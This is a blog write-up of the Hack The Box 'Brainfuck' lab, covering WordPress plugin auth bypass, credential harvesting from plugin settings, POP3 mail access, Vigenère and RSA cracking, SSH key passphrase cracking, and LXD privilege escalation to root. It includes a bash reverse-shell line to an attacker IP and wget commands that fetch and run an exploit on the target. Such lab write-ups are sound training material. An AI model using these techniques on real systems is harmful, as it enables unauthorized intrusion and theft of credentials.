---
layout: post
title:  "Brainfuck Writeup - Hack The Box"
date:   2025-03-03
desc: ""
keywords: "HTB,eWPT,OSCP,Linux,TLSCertificate,WordPress,InformationLeakage,SMTP,CryptoChallenge,LXD,RSACryptoChallenge,Insane"
categories: [HTB]
tags: [HTB,eWPT,OSCP,Linux,TLSCertificate,WordPress,InformationLeakage,SMTP,CryptoChallenge,LXD,RSACryptoChallenge,Insane]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

I choose the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform because when I face a machine, I can find several different challenges, i mean, different themes, which makes that the difficulty may not be a particular vulnerability but to find the way to engage the target. And for the **Brainfuck** box I needed to be very concentrated from the beginning to deduce what action to perform, the vulnerabilities are not very complex to exploit but there are cryptographic challenges that may require research on the topic and if desired, to enrich the scripting facet, to program a tool in the language that one feels more comfortable. Well, to spawn the box and start the task of **engagement**.

<br /><br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

On the **[Legacy](https://alejobarto8.github.io/htb/2025/02/21/legacy-writeup.html){:target="_blank"}** machine, I made the big mistake of not being **100% focused** on the **Reconnaissance phase**, and due to this irresponsibility I lost a lot of time in finding the right way to engage the box, so <ins>I have learned my lesson</ins>. After spawning the machine I verify that I have connectivity with it, and also thanks to the **ttl** value that I get by sending a trace with `ping` I can check the **OS** that the target has (**Linux**). With `nmap` I can have an overview of the exposed ports, services and their corresponding versions, to think about possible vulnerabilities. The most interesting thing that I find at the moment are domains and subdomains, also with the versions of the services I find the **Codenames** of the machine, to know if containers are being implemented (**it seems that no**).

```bash
ping -c 1 10.129.57.247
whichSystem.py 10.129.57.247
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.129.57.247 -oG allPorts

nmap -sCV -p22,25,110,143,443 10.129.57.247 -oN targeted
cat targeted
# --> OpenSSH 7.2p2 Ubuntu 4ubuntu2.1
# --> nginx 1.10.0
# --> DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
```

<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I start with the **HTTP** protocol, although in this case the **HTTPS** encrypted protocol is being implemented on port **443**, but with `whatweb` or **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I can't find much information, so I'm going to focus on the subdomains that `nmap` leaked me. I validate with `openssl` the I must modify my ***hosts*** file so that the browser can match the domain and subdomain with the **IP** of the server, then I test the communication through a trace using `ping` and again I use `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}**, but this time if I find relevant information, a **WordPress CMS** is being implemented and the web server is a **Nginx**.

> **[WordPress](https://www.investopedia.com/terms/w/wordpress-cms.asp){:target="_blank"}** is a popular open-source content management system (**CMS**). Although it was originally associated mainly with personal blogs, it has since become used for a wide variety of websites, including professional publications and e-commerce platforms. 

> **[nginx](https://nginx.org/en/){:target="_blank"}** ("engine x") is an HTTP web server, reverse proxy, content cache, load balancer, TCP/UDP proxy server, and mail proxy server. Originally written by Igor Sysoev and distributed under the 2-clause BSD License.

```bash
whatweb https://10.129.228.97

# Validate subdomains
openssl s_client --connect 10.129.228.97:443
# brainfuck.htb

nvim /etc/hosts
cat /etc/hosts | tail -n 1
ping -c 1 brainfuck.htb
ping -c 1 sup3rs3cr3t.brainfuck.htb

whatweb https://brainfuck.htb/ https://sup3rs3cr3t.brainfuck.htb/
# orestis@brainfuck.htb
# [WordPress 4.7.3]
```

<br/>
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Of the two web services available I put my focus on the **WordPress CMS**, I notice that it is vulnerable to **user enumeration** (the **admin** user is valid), there is also a path found in an **[ExploitDB](https://www.exploit-db.com/exploits/41497){:target="_blank"}** exploit to enumerate but it does not exist or is not available, so I will have to look for another way to compromise the box. Ports **25** (**SMTP**) and **110** are also exposed, but if I try to use `smtp-user-enum` or **[`nc`](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-pop.html?highlight=port%20110#basic-information){:target="_blank"}** to leak information, I have no success. There is something that catches my attention when accessing one of the **CMS WordPress** paths, which appears to be a possible plugin installed. But if I use `wfuzz` with a **[SecLists](https://github.com/danielmiessler/SecLists){:target="_blank"}** dictionary to find installed plugins, I only find one that comes by default but nothing else, it seems to me that the dictionary is too small for the amount of plugins currently available.

> **[Port 110](https://sslinsights.com/what-is-port-110/){:target="_blank"}** is a 16-bit **TCP** and **UDP** port number used by internet applications to identify specific services and protocols. It is one of the standard registered port numbers defined by the Internet Assigned Numbers Authority (IANA) for use with the TCP/IP protocol.

> **[SMTP (Simple Mail Transfer Protocol)](https://www.techtarget.com/whatis/definition/SMTP-Simple-Mail-Transfer-Protocol){:target="_blank"}** is a **TCP/IP** protocol used in sending and receiving emails over a network such as the internet. It is not an email retrieval protocol; however, it provides a standardized method for email delivery, thus enabling email clients and mail servers to exchange data.

> **smtp-user-enum** is a tool for enumerating OS-level user accounts on Solaris via the **SMTP** service (sendmail). Enumeration is performed by inspecting the responses to **VRFY**, **EXPN** and **RCPT TO** commands. It could be adapted to work against other vulnerable **SMTP daemons**, but this hasn’t been done as of v1.0.

```bash
# https://brainfuck.htb/
# --> user: admin!!!
# https://sup3rs3cr3t.brainfuck.htb/

searchsploit wordpress user enumeration
searchsploit -x 41497.php

nc 10.10.10.17 110 USER orestis PASS orestis
# :(

telnet 10.129.228.97 110
#  admin admin   :(

smtp-user-enum -M VRFY -U /usr/share/SecLists/Usernames/Names/names.txt -t 10.129.228.97

wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt 'https://brainfuck.htb/FUZZ'
cat /usr/share/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt | wc -l
# 13370       A very short list!
```

<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

To perform more effective directory enumeration, I create a custom dictionary by extracting plugin names from the **[WordPress plugin repository on Github](https://github.com/wp-plugins){:target="_blank"}** that have a name similar to **Ticket**. I perform a new enumeration and find the name of the installed plugin, I also realize that it was not necessary so much work since **Directory Listing** is configured on the server and all the plugin directories are being leaked, but it is always good to practice known techniques. If I browse and inspect a little with the browser it finds the plugin version.

```bash
curl -s -X GET 'https://github.com/orgs/wp-plugins/repositories?q=ticket&page=1' | html2text | grep '\* \*' | awk '{print $3}'
for index in $(seq 1 2); do curl -s -X GET 'https://github.com/orgs/wp-plugins/repositories?q=ticket&page=$index' | html2text | grep '\* \*' | awk '{print $3}'; done > tickets-plugins.txt

wfuzz -c --hc=404 -w ./tickets-plugins.txt 'https://brainfuck.htb/wp-content/plugins/FUZZ'
# wp-support-plus-responsive-ticket-system

# https://brainfuck.htb/wp-content/plugins/
# https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
# --> readme.txt        = V 7.1.3 =

# https://brainfuck.htb/wp-content/plugins/       Directory Listing
```

<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With `searchsploit` I find some exploits for **WP Support Plus Responsive Ticket System 7.1.3** plugin version, but also in **[ExploitDB](https://www.exploit-db.com/){:target="_blank"}** I find a more complete list. One of the exploits performs a **SQL Injection**, but I'm going to try first with another one that directly performs a **Privilege Escalation** by exploiting a vulnerability in the function that sets the authentication cookie. I just have to follow the instructions and first create an **index.html** file to **POST** the username to the file (**admin-ajax.php**) that has the vulnerable function and generate the cookie.

```bash
searchsploit wp-support-plus-responsive-ticket-system 7.1
# 40939
searchsploit -x php/webapps/40939.txt

searchsploit -x php/webapps/41006.txt
nvim index.html
cat !$
```

<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The exploitation turns out to be very simple following the instructions of the exploit, I just have to configure a local server with `python3`, in this way access with the browser and send the request using the **POST** method to the **.php** file with the vulnerable function, with the name of the **admin** user, which I know exists in the **WordPress CMS** database. Once the request is made through the form, it redirects me to the file path and shows me a **0** as a response, which I guess must be a successful action. To confirm I access the **WordPress CMS** administration panel and refresh the page and I can access successfully.

```bash
sudo python3 -m http.server

# http://localhost
# admin
# https://brainfuck.htb/wp-admin    :)
```

<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I also have available the **[`wpscan`](https://wpscan.com/){:target="_blank"}** tool, which automates the search for vulnerabilities in a **WordPress CMS**, in this case I just have to remember to disable the **SSL/TLS** certificate verification and I can start the tool. It shows me detailed information, tells me that the procedure calls over the Internet is enabled (**XML-RPC**) and also finds the vulnerable Plugin, in case the manual enumeration is too slow or too complex, it is a good option to use this tool.

```bash
wpscan --help
wpscan --url https://brainfuck.htb
# SSL peer certificate or SSH remote key was not OK
wpscan --url https://brainfuck.htb --disable-tls-checks
# --> Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
```

<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I try to access the machine in the simplest way I know, which is to modify the **404.php** file of the Theme and inject a code in **PHP** to send me a **Reverse Shell**, but after several attempts I notice that I don't have the necessary permissions to save the changes. So I investigate a bit the **Dashboard** and I find in the **Easy WP SMTP** plugin the credentials of the **`orestis`** user.

```html
# Appearance --> Editor --> 404.php
# system("bash -c 'bash -i >&/dev/tcp/10.10.14.84/443 0 0>&1'");

# Settings -> Easy WP SMTP Settings -> [Source code: password -> text]
```

<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With the credentials obtained, I first try to connect via **SSH**, but password access is disabled, a public key is needed, but if I try on port **110** with `nc`, I achieve my goal. Once authenticated, I list the saved messages, and in the last one I find new credentials. From the content of the message, it makes me suspect that they are from the web service on the subdomain that I had found in the **Reconnaissance** phase. The credentials are valid and access a Forum where secrets are stored and shared.

```bash
ssh orestis@brainfuck.htb
# :( Public Key
nc 10.129.228.97 110 USER orestis PASS kHGuERB29DNiNE

nc 10.10.10.17 110
# :) USER ... PASS ...
  LIST
  RETR 1
  RETR 2

# https://sup3rs3cr3t.brainfuck.htb/
# :)
```

<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I access one of the secret forums, there is an unfriendly chat between the user **orestis** and the **administrator**, where he complains about the impossibility to access via **SSH**. In another of the secret forums, the conversation continues, but unfortunately it is encrypted. One of the things that I am taking into account, is that for some encrypted texts I can intuit what is the clear text. From the style of the text, I have a sneaking suspicion that a text encryption method is being used. There is the online tool **[Quipqiup](https://quipqiup.com/){:target="_blank"}**, where you can try to break the encryption but I have no luck. One of the available options I note in the tool is the **Vigenère** method, which requires a key.

> **[Vigenère Cipher](https://www.geeksforgeeks.org/vigenere-cipher/){:target="_blank"}** is a method of encrypting alphabetic text. It uses a simple form of polyalphabetic substitution. A polyalphabetic cipher is any cipher based on substitution, using multiple substitution alphabets. The encryption of the original text is done using the Vigenère square or Vigenère table.

```html
# https://sup3rs3cr3t.brainfuck.htb/
# General -> Secret -> Key
# https://sup3rs3cr3t.brainfuck.htb/d/3-key/3
```

<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The **Vigenère** cipher can be easily broken if you have the **ciphertext** and the **cleartext**, you only need to apply a formula and you can get the **key**, there is the **[Cryptii](https://cryptii.com/pipes/vigenere-cipher){:target="_blank"}** resource on the **Internet** that makes it easy for me. Once I have the key I can decipher the messages and a **URL** where the key seems to be hosted to connect on the **SSH** service available.

```html
# I have plain text:      Orestis - Hacking for fun and profit
# And the cipher text:    Pieagnm - Jkoijeg nbw zwx mle grwsnn

# Decode: PieagnmJkoijegnbwzwxmlegrwsnn : OrestisHackingforfunandprofit       --> Brainfuckmybrainfuckmybrainfu
# fuckmybrain
```

<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

It is at this point where it is possible to make a small script in `python3` to break the **Vigenère** cipher, there are many resources where you can find the key (**[How do you crack the Vigenère cipher if you have plaintext and encrypted text](https://www.quora.com/How-do-you-crack-the-Vigen%C3%A8re-cipher-if-you-have-plaintext-and-encrypted-text-but-dont-know-the-key-Is-it-possible-to-crack-it-without-knowing-the-key){:target="_blank"}**), if you have the cipher text and the clear text. Once I already have the correct formula I only have to take into account the number of the position of the beginning of the vocabulary in **Lowercase** (letter **a**) in the **ascii** code, since it is the one that must be placed in the formula.

```bash
# Key character=(Ciphertext character − Plaintext character + 26) mod 26

nvim vigenere_cracker.py
python3 vigenere_cracker.py

# General -> Secret -> Key: mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr
```

> **vigenere_cracker.py**:

```python
#!/usr/bin/python3

plain_text = "OrestisHackingforfunandprofit"
cipher_text = "PieagnmJkoijegnbwzwxmlegrwsnn"
key = ""

for i in range(len(plain_text)):
    decimal_value = ((ord(cipher_text[i]) - ord(plain_text[i])) % 26) + 97
    key += chr(decimal_value)

print(key)
```

<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I can now download the **key** of the path that I have just deciphered to connect via **SSH**, unfortunately it has a password. I already have some experience with this problem, I just need to get the **hash** of the file with `ssh2john` and then with `john` get the password, in case it is in the dictionary **rockyou.txt**. I am lucky and in a very short time `john` gets the password. Now if I succeed to connect via **SSH** and perform the basic reconnaissance commands to collect information that allows me to know the **Operating System** and possible vectors to **Escalate Privileges**. He confirms that the Codename is **Xenial**, I can see the content of the first flag, with `id` I find out that the user belongs to the **LXD** group (<ins>possible vector</ins>) and I also find very interesting files related to the **RSA** encryption algorithm (I still don't know its purpose).

> **Attacker Machine**:

```bash
# https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa

chmod 600 id_rsa
ssh -i id_rsa orestis@brainfuck.htb
# Passphrase          :(

locate ssh2john
/usr/bin/ssh2john id_rsa > hash
john --wordlist=$(locate rockyou.txt)                                 # [Tab]
john --wordlist=/usr/share/wordlists/rockyou.txt hash
john hash --show

ssh -i id_rsa orestis@brainfuck.htb
```

> **Victime Machine**:

```bash
whoami
hostname
hostname -I
uname -a
lsb_release -a
export TERM=xterm
id
# --> lxd     searchsploit lxd -> S4vitar!!
groups
```

<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_58.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_59.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_60.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_61.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_62.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I know that the user **orestis** belongs to the **LXD** group, I can download the **S4vitar** exploit to **Escalate Privileges**. It is very simple to exploit, you must follow the instructions detailed in the exploit, first I will download the exploit with `searchsploit`, then download the **build-alpine** container, build the container and modify the script (<ins>recommended by the creator</ins>). Once all the necessary steps are done, I just need to transfer to the target machine, both the **exploit** and the **container**, give execution permissions to the malicious script and execute it by passing with the **-f** parameter the container. What the script does is to deploy the container and through **mounts**, it links the **/root** directory of the host in the **/mnt** directory of the container, and then automatically gives you a **shell** inside the container. I can now search and see the content of the last flag.

> **Attacker Machine**:

```bash
searchsploit lxd
searchsploit -m linux/local/46978.sh
mv 46978.sh lxd_exploit.sh
# Tips: > dos2unix lxd_exploit.sh

cat !$
# --> delete: lxd init --auto

sudo su
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
chmod +x build-alpine
./build-alpine
python3 -m http.server 80
```

> **Victime Machine**:

```bash
wget http://10.10.14.84/lxd_exploit.sh
wget http://10.10.14.84/alpine-v3.14-x86_64-20210711_1303.tar.gz
nano lxd_exploit.sh
cat lxd_exploit.sh | grep 'lxc image import'
chmod +x lxd_exploit.sh
./lxd_exploit.sh alpine-v3.14-x86_64-20210711_1303.tar.gz
./lxd_exploit.sh -f alpine-v3.14-x86_64-20210711_1303.tar.gz

whoami
cd /mnt/root/root
```

<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_63.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_64.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_65.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_66.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_67.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_68.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Another way to access the **root** user's flag is through the file that I found in the enumeration of the target machine. It encrypts the flag using the **RSA** encryption algorithm and stores it in the **output.txt** file, but gives me all the information I need (the values of the prime numbers **p** and **q**, plus the value of the exponent **e**) and then I can use the online tool **[Crytool](https://www.cryptool.org/en/){:target="_blank"}** to enter these values and get the plaintext. Then with **python3** and **xxd** I can get the value of the flag.

```bash
cat encrypt.sage
cat debug.txt
# --> p,q,e
cat output.txt
# --> root.txt ?

python3
  hex(24604052029401386049980296953784287079059245867880966944246662849341507003750)
  hex(24604052029401386049980296953784287079059245867880966944246662849341507003750)[2:]

echo "3665666331613564626238393034373531636536353636613330356262386566" | xxd -ps -r; echo
```

<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_69.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_70.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_71.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_72.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_73.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_74.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_75.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> While the box has many **CTF-style** challenges, the **Privilege Escalation** and **Enumeration** techniques are more closely tied to a real-world environment. I am never disappointed with **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machines, so I kill the box and can move on to the next one.

<br /><br />
<img src="{{ site.img_path }}/brainfuck_writeup/Brainfuck_76.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
